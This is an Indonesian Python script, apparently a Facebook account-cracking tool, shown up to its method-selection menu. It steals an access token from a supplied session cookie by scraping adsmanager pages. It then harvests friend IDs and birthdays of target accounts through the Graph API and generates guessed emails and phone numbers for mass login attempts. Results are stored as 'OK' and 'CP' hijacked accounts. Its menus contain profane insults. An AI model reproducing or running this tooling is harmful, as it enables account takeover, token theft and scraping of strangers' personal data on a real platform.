⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠲⣶⣶⣶⣿⣿⣿⣶⣶⣶⠖⠂⠀⠀⠀⠀⢠⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠉⣿⣿⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠛⢿⣿⡆⠀⠀⠀⠀⠀⠀⠈⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠟⠉⠀⠀⠀⠉⠻⠀⠀⠀⠀⠀⠀⠀⠀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⣸⣧⣀⡀⡀
⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠙⢻⣿⣿⡿⠋
⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⡾⠋⠙⢿
⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉
⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣍⡉⠉⠉⠀⠀⠀⠈⠉⠉⢉⣽⣿⣿⣿⣿⣿⣿⠟⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⡿⠋⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢙⣿⣿⣿⣿⡟⠀⢀⣠⣀⠀⠈⣿⣿⣿⣿⣟⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣡⣴⣿⣿⣿⣷⣤⣹⣿⣿⣿⣿⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣷
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣇
⠀⠀⠀⠀⠀⠀⠀⠀⠼⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⡄
             """)
def bintang1():
              cetak(f"[blue]                   MIKIR NGEN** ")          
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""{color_logo} \n         \r
               ______   __  __     ______   ______    
              /\__  _\ /\ \_\ \   /\  == \ /\  __ \   
              \/_/\ \/ \ \____ \  \ \  _-/ \ \ \/\ \  
                 \ \_\  \/\_____\  \ \_\    \ \_____\ 
                  \/_/   \/_____/   \/_/     \/_____/ 
                  
                  AUTHOR:[green]TYPO Z
             """,width=100,title=f"[bold green]LOGO TYPO",padding=(0,5),style=f"{color_panel}"))
             #####pilih NEW###
def tam():
	banner()
	#cetak(panel(f"[[bold cyan]01[{color_panel}]] Crack Nomor \n[[bold cyan]02[{color_panel}]] Crack \n[[bold cyan]03[{color_panel}]] Crack   ",width=60,title=f"[bold green]Menu TAMBAHAN",padding=(0,8),style=f"{color_panel}"))
	cetak(panel(f" [[bold cyan]01[{color_panel}]] Crack PUBLIC \n [[bold cyan]02[{color_panel}]] Crack EMAIL \n [[bold cyan]03[{color_panel}]] Crack FILE \n [[bold cyan]04[{color_panel}]] Crack EXIT \n [[bold cyan]05[{color_panel}]] NOTE DARI GUA",width=60,title=f"[bold green]Menu TAMBAHAN",padding=(0,2),style=f"{color_panel}"))
	#cetak(panel(f"[[bold cyan]02[{color_panel}]] Crack EMAIL ",width=50,padding=(0,2),style=f"{color_panel}"))
	#cetak(panel(f"[[bold cyan]03[{color_panel}]] Crack FILE ",width=40,padding=(0,2),style=f"{color_panel}"))
	#cetak(panel(f"[[bold cyan]04[{color_panel}]] Crack EXIT ",width=30,padding=(0,2),style=f"{color_panel}"))
	#cetak(panel(f"[[bold cyan]05[{color_panel}]] NOTE DARI GUA \n",width=100,padding=(0,2),style=f"{color_panel}"))
	cetak(panel(f"      ",width=100,padding=(0,2),title=f"[blue]!! KETIK [red]CEK [blue]UNTUK LIAT HASIL !!",style=f"{color_panel}"))
	cetak(f"                ")	
	typo = input(f' [+] Pilih Menu Crack : ')
	cetak(panel(f"                     [red]!! TA ATI PERATURAN !!",width=100,padding=(0,2),style=f"{color_panel}"))
	if typo in(''):
		print(' [+] Pilih Yang Bener Asu ');back()
	if typo in('1','01'):
		login()
	elif typo in('2','02'):
		mail()		
	elif typo in('3','03'):
		file()		
	elif typo in('4','04'):
		exit()		
	elif typo in('5','05'):
		note()
	elif typo in('6','cek'):	
		result()
	elif typo in ['tambah','t']:
		 lainnya()
	elif typo in ['p']:
		()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		exit()
             
                                      
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
ses = requests.Session()
def login_lagi334():
	os.system('clear') 
	banner()
	prints(nel(f'{P2}Kalau {H2}Dump ID {M2}0 {P2}GANTI COOKIES {P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	cok = input(f'[{M}{N}] Masukkan cookie : ')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		#exit(link.text)
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);masuk();batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				open(f'[{M}>{N}] Token : {H}{took}{N}')
				open(f'[{M}>{N}] Login Successfull')
				exit()
	except Exception as e:
		print(e)
		
#------------------[ BAGIAN LOGIN ]----------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Kues Kadaluarsa ')
		time.sleep(2)
		login_lagi334()			
	
	prints(nel(f'{P2}Ketik {H2}Tambah {P2}menu New Dan Ketik {M2}0 {P2}BUAT HAPUS COOKIES {P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	prints(nel(f"""{P2}[{color_text}01{P2}] Crack Massal    [{color_text}04{P2}] Cek Ressult
[{color_text}02{P2}] Crack Publik    [{color_text}05{P2}] Crack File
[{color_text}03{P2}] Clone ID Email  [{color_text}00{P2}] Exit Program""",width=70,title=f"[bold green]Menu TOLS",padding=(0,7),style=f"{color_panel}"))
	TYPO = input(f'✶ ━━⫸ {H} Input{N} : ')
	if TYPO in ['1']:
		nge_crack()
	elif TYPO in ['2']:
		prints(nel(f'                    {M2}Crack Orang{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		idt = input('✶ ━━⫸ ID Target : ')
		dump(idt,"",{"Kue":cok},token)
		setting()
	elif TYPO in ['3']:
		mail2()
	elif TYPO in ['4']:
		result()
	elif TYPO in ['5']:
		file()
	elif TYPO in ['tambah','t']:
		 lainnya()
	elif TYPO in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .Kue.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
	#----------------------[ MENU CRACK LAINNYA ]----------------------#
def lainnya():
	prints(nel(f'             {H2}Saran {H2}Tambahan = {P2}menu New{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	cetak(panel(f"[[bold cyan]01[{color_panel}]] Crack Nomor \n[[bold cyan]02[{color_panel}]] Crack Nasa\n[[bold cyan]03[{color_panel}]] Crack Bulan\n[[bold cyan]04[{color_panel}]] CrackBintang ",width=60,title=f"[bold green]Menu TAMBAHAN",padding=(0,8),style=f"{color_panel}"))
	cetak(panel(f" [green]                   5",width=60,title=f"[bold green][5]",padding=(0,8),style=f"{color_panel}"))
	typo = input(f' [+] Pilih Menu Crack : ')
	if typo in(''):
		print(' [+] Pilih Yang Bener Asu ');back()
	if typo in('1','01'):
		nomor()
	elif typo in('2','02'):
		nasa()
		nasa1()
	elif typo in('3','03'):
		bulan()
		bulan1()
	elif typo in('4','04'):
		bintang()
		bintang1()
	elif typo in('5','05'):
		nasa()
		bulan()
		bintang()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		exit()
		
		###----------[ CRACK MASSAL ]----------###
def nge_crack():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'┗━ 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙹𝚄𝙼𝙻𝙰𝙷 𝚃𝙰𝚁𝙶𝙴𝚃 : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'┗━ 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙸𝙳  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print("┗━ 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 : "+str(len(id))) 
	      atur_dulu()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
		
#-------------------[PUBLIK]--------------------#    
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r[{H}>{N}] sedang {H}{len(id)}  {P}Berjalan"),
			#sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....\n"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
	
###[ PUBLIK CLONE ]###
def mail():
	dump=[]
	rc = random.choice
	rr = random.randint
#	tengah = ['karisma','rahayu','sumiati','saluyu','mulyani','melani','meylani','wahyuni','ningsih','nengsih','suninsgih','sunengsih','yunensgih','sunengsih','aprianti','apriani','apriliani','aprilia','apriani','sukaesih','bohay','montok','sayang','julianti','julianto','yulianti','yulianto','suherni','damayanti','permatasari','lestari','sumarni','suherni','sutini','septiani','febrianti','widiawati','widyawati','azizah','fatimah','azzahra','azzizah','melati','pratiwi','pertiwi','karlina','marlina','gumilang','oktavia','oktaviani','rahmawati','fatmawati ','larastri','sulastri','amanda','ananda ','kurniasih','evve','rokayah','hidayah ','aisyah','nuraisyah','nurfatimah','nurahma','wulandari','syariah','badriah','daratista','nurazizah','nurhanipah','nurazahra','safitri','sapitri','nursafitri','maharani','menlinda','gelis','hungkul','sandini','manopo','wijayanti','dwilestari','lanjar','melani','supriani','sukanri','kusmayanti','rosawati','madara','malaka','ollshop','daniati','nurlaila','anggraena','anggraeni','solipah','khoerunisa','rachmawati','nurjanah','sayank','purnama','ferawati','selebew','ebew']
	tengah = ['mulyani','mulyati','melani','melinda','aisyah','azahra','azizah','azzahra','azzizah','nurahma','nuraisyah','nursafitri','nurfatimah','nurjanah','fatimah','lestari','sulastri','pratiwi','peratiwi','purnama','permata','sariah','handayani','wicaksono','manurung','sinaga','sihombing','salsabila','purwanti','sabila','aropah','nadifa','meylani','nuraropah','ferawati','kusmayanti','damayanti','nurlaila','anggraena','anggraeni','anggraini','solipah','rahmawati','yulianti','julianti','yuliani','yuliana','ratnasari','sandini','andini','maharani','safitri','sapitri','fitriani','dwi','dwilestari','manopo','rosmawati','olshop','daniati','sukaesih','periatin','supritin','sutini','angelina','ekaputri','widiawati','fatmawati','hidayah','aprilia','apriliani','aprianti','apriani','wahyuni','suryani','suryati','karisma','nurasih','maharani','rahayu','saluyu','suningsih','sunengsih','ningsih','nengsih','yunengsih','yuningsih','safira','suherni','evve','bohay','cantik','syantik','sayang','sayank','cayank','andiani','montok','jayanti','febrianti','febriani','harahap','mirawati','suryani','mustafa','agustian','agustiani','melayu','karlina','karmila','susanti','kurniasari','darwati','mawarti','hungkul','harnika','chaniago','adinda','hasibuan','sinaga','rodiah','nuryani','sumiati','cahyani','cahaya','nurcahya','bintang','bandung','gamers','kartika','kartini','ismawati']
#	tengah = ['ramadhan','ramadhani','ramdhan','ramdani','ramadani','hamdani','saputra','saputro','armada','irawan','wirawan','wijaya','wijayanto','wijayanti','kurnia','kurniawan','setiawan','setyawan','pratama','peratama','purnama','purnomo','maulana','mulyana','mulyono','sinaga','sihombing','hidayat','firmansah','lesmana','rusmana','bengkel','muhamad','ruhyadi','setiadi','septiadi','suhardi','suharto','supomo','sutomo','sumanto','sumanta','ardiansah','ardiansyah','damayanto','wiguna','suherman','dermawan','darmawan','darmansah','dermansah','dermanto','hermanto','hermawan','hermansah','suhendra','iskandar','pasundan','gumilang','dirgantara','cahyono','cahyadi','mulyadi','laksana','pangestu','fahrezi','ganteng','gaming','geming','kasep','geulis','mamahmuda','alfiansah','alhidayat','nurahman','nugraha','nurohman','nuryansah','nugroho','sadboy','pembangkang','berontak','gumilar','sumedang','gaming','geming','gamers','freefire','hyper','alok','bocil']
	global ok , cc
	nama = input(f'{P}[{H}?{P}] Username : ').split(',')
	if 'NGENTOD' in str(nama):
		print(f' {P}└─{J} masukan nama, jangan kosong ')
		time.sleep(3);exit()
	doma = '@gmail.com'
	jumlah = '3789'
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [f'{str(rc(tengah))}{str(rr(0,10000))}']
		CC = doma
		DD = f'{str(rc(AA))}{str(rc(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+rc(nama))
		if len(dump)==999999:passwrd()
	setting()
	#----- [Note]-----#
def note():
	wa.print(f'[red] SC ini saya buat Dengan Gabungan Sc" Yang saya Punya \n              Fitur-Fitur  \n 1. Public \n 2. Email \n 3.  File  \n 4. Exit \n  5.  Note [green]\n DAN MENU TAMBAHAN LAINNYA  [blue]\n Saya Membuat/Recode Sc ini cuna Saya Gabut doang Sih hehe jadi Semoga Kalian Menikmati sc Buatan/Recode Saya [green]TYPO') 	
	___Typo_Z____ = input(f'✶{H} Ketik {K}1{H} Untuk Ke Menu awal{N} : ')
	if ___Typo_Z____ in ['1']:
		tam()
#-----------------[ CRACK EMAIL ]-----------------#
def mail2():
	dump=[]
	rc = random.choice
	rr = random.randint
	tengah = ['mulyana','mulyono','ramdani','ramdan','ramadhan','ramadhani','saputra','syahputra','wijaya','kusuma','irawan','wirawan','setiawan','setyawan','hamdani','dermawan','sulaeman','pasundan','gumilang','gumilar','saepuloh','setiadi','rusmana','lesmana','suparman','hermansah','suherman','wijayanto','saripudin','saepudin','firmansyah','hidayat','kurnia','kurniawan','ramadani','muhamad','alamsyah','maulana','aprilia','apriliani','yulianti','julianti','sumiati','rahayu','saluyu','maharani','mulyani','rusmini','aisyah','fatimah','lestari','mulyati','damayanti','pertiwi','handayani','azizah','apipah','aropah','nuraisah','nurlaila','nursafitri','nurcahaya','nurjanah','nurfatimah','rahmawati','rosmawati','larasti','purnama','nurohman','nurahman','adinda','sumarni','sukaesih','bintang','kirana','cahyani','nurarsyila','amanda','sulastri','septiani','kartina','karlina','nuraropah','isabela','safitri','mawarni','rofikah','nengsih','ningsih','yuningsih','yunengsih','suningsih','sunengsih','malaka','azzahra','larasati','pertiwi','pratiwi','asyifa','aminah','nasution','sitorus','sinaga','sihombing','simamora','saepuloh','susanto','santoso','nursuci','khoerunisa','fitriani','sutomo','khan','singh','hartono','ruhyadi','ardiansyah','hardiansyah','herdiansyah','sinaga','prasti','kejora','rokayah','supriadi','willyam','wibowo','armada','darmawan','badriah','sulistia','fadilah','natalia','handayani','rusmiati','nurahma,nursakila,salsabila','hungkul','sayang','gaming','utama','pertama','peratama','pratama']
	belakang = ['777','999','111','222','333','444','638','656','556','452','281','812','235','898','998','110','739','892','344','87','665','81','sumarna','dermawan','darmawan','dirgantara','wijayanto','wijayanti','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','372','882','9238','194','883','809','293','251','726','332','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','82','83','766','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','655',',223','332','331','313','62','63','64','65','66','67','68','gaming','123','321','332','033','721','768','988','998','901','425','719','223','7789','0018','335','827','811','880','092','064','862','6672','82','91','21','23','31','45','54','677','882','98','890','728','112','221','236','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25']
	tengah = ['widianti','yuliyanti','yulianto','supomo','sapitri','rancaekek','yuliana','aprianti','aprilianti','andini','hasanah','karimah','halimah','salamin','farida','adinda','kurniasih','sulistiawati','nurkarimah','nurazizah','daniati','geulis','cantik','imut','gemoy','kece','indrawan','rachmatika','sugiarti','sugih','ferdiansyah','nuraropah','sagita','nuralisa','setiawati','ramayanti','soraya','badriah','sutomo','supardi','supriadi','suparman','solehah','kasep']
	global ok , cc
	nama = input(f'{P}[{H}?{P}] nama target : ')
	if ',' in str(nama):
		print(f' {P}└─{J} masukan nama, jangan kosong ')
		time.sleep(3);exit()
	doma = input(f'{P}[{H}?{P}] domain (ex:@gmail.com) : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f' {P}└─{J} masukkan domain dengan benar ')
		time.sleep(3);exit()
	jumlah = input(f'{P}[{H}?{P}] total dump (max:10000) : ')
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [f'{str(rc(tengah))}',f'{str(rr(0,31))}',f'{str(rc(belakang))}']
		CC = doma
		DD = f'{AA}{str(rc(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+nama)
		if len(dump)==999999:passwrd()
		sys.stdout.write(f"\r{P}[{H}±{P}] berhasil mengumpulkan {asu}{len(id)} {P}email...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()
	
	###nomor##
def nomor():
	print()
	depan = input('* awalan nomor (contoh > 089) : ')
	if len(depan)==3:pass
	else:exit(f'* contoh awalan nomor 089')
	jumla = input('* jumlah : ')
	for x in range(int(jumla)):
		rr = random.randint
		A1 = depan
		B1 = rr(1111,9999)
		C1 = rr(1,9)
		D1 = f'{A1}{C1}-{str(rr(1111,9999))}-{str(B1)}'
		if D1 in id:pass
		else:id.append(D1+'|123456')
		print('\r* berhasil mengumpulkan %s nomor '%(len(id)),end='')
		sys.stdout.flush()
	print("\r")
	setting()
#-----------------[ CRACK FILE ]-----------------#
def crack_file():
	try:vin = os.listdir('/sdcard/downloads/')
	except FileNotFoundError:
		print(' [+] File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print(' [+] Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/DUMP-FILE/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'\n %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input(' [+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f' [+] Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/DUMP-FILE/'+geh,'r').read().splitlines()
		except:
			print(' [+] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		setting()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'{B}[{J}01{B}] {P}Hasil {h}OK{x} Anda ')
	print(f'{B}[{J}02{B}] {P}Hasil {k}CP{x} Anda ')
	kz = input(f' └── Pilih : ')
	if kz in ['02','2']:
		
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f' {P}└─{J} file tidak di temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f' {P}└─{J} anda tidak memiliki hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[0%s] %s {K}%s {x}Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+f' {K}'+str(len(hem))+f' {x}Account'+x)
			geeh = input(f' └── Pilih : ')
			
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{J} pilih yang benar...')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{J} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {K}{cpkuni[0]}{P}│{K}{cpkuni[1]}')
				nocp +=1
			
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['01','1']:
		
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f' {P}└─{J} file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' {P}└─{J} anda tidak mempunyai fileOK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {H}%s{x} Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {H} %s {x}Account'%(cih,isi,(len(hem))))
			geeh = input(f' └── Pilih : ')
			
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{J} pilih yang bener kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{J} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {h}{cpkuni[0]}{P}│{H}{cpkuni[1]}{P}│{h}{cpkuni[2]}{x}')
				nocp +=1		
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f' {P}└─{J} pilih yang bener kontol ')
		back()

		
###----------[ BACA ]----------###
def setting():
	prints(f' ')
	prints(nel(f'               {P2}login ID Crack{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	cetak(nel(f"{P2}[{color_text}01{P2}]. Facebook ID {M2}Old\n{P2}[{color_text}02{P2}]. Facebook ID {K2}New\n{P2}[{color_text}03{P2}]. Facebook ID {H2}Random{P2}",title=f"{H2}{len(id)}{P2} ID TELAH DIKUMPULKAN",width=70,padding=(0,7),style=f"{color_panel}")) 
	hu = input(f'✶ ━━⫸ Input : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua) 
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		prints(nel(f'         {P2}Input Tidak Diketahui{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		exit()	
	prints(nel(f'{P2}[{color_text}01{P2}]. Method free.facebook.com [[green] Validate [white]]\n[{color_text}02{P2}]. Method m.facebook.com [[green] Async [white]]\n[{color_text}03{P2}]. Method graph.facebook.com [[green] B-Api [white]]',title=f"[bold green] PILIH METODE",width=70,padding=(0,7),style=f"{color_panel}")) 
	prints(nel(f'{P2}[{color_text}04{P2}]. Method  [[green] NEW1 [white]]\n[{color_text}05{P2}]. Method  [[green] NEW2 [white]]',width=70,padding=(0,7),style=f"{color_panel}")) 
	hc = input(f'✶ ━━⫸ {H} Input{N} : ')
	if hc in ['1','01']:
		method.append('metod1')
	elif hc in ['2','02']:
		method.append('metod2')
	elif hc in ['3','03']:
		method.append('metod3')
	elif hc in ['4','04']:
		method.append('metod4')
	elif hc in ['5','05']:
		method.append('metod5')
